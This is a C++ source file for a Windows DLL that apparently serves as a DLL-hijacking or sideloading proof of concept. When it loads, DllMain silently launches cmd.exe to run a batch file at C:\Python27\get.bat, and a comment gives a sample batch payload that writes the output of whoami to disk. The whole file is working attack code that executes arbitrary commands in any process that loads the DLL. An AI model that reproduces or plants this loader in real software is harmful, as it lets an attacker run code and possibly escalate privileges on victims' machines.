// x86_64-w64-mingw32-g++ run_dll2.cpp -o lib.dll -shared
// get.bat: %COMSPEC% /c whoami > C:\Python27\whoami.txt

#include <windows.h>

int fileExist(LPCTSTR file) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;

	hFind = FindFirstFile(file, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		MessageBox(0, NULL, TEXT("File not found"), MB_OK);
		return 0;
	}
	else
	{
		FindClose(hFind);
	}
	return 1;
}

void scriptExec(void) {

	TCHAR batPath[50] = TEXT("C:\\Python27\\get.bat");

	if (!fileExist(batPath)) {
		return;
	}

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	TCHAR lpszClientPath[100] = TEXT("C:\\Windows\\system32\\cmd.exe /c C:\\Python27\\get.bat");
	if (CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
		MessageBox(0, NULL, TEXT("Success"), MB_OK);
	}
	else {
		MessageBox(0, NULL, TEXT("Failure"), MB_OK);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			scriptExec();
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) int main() {
}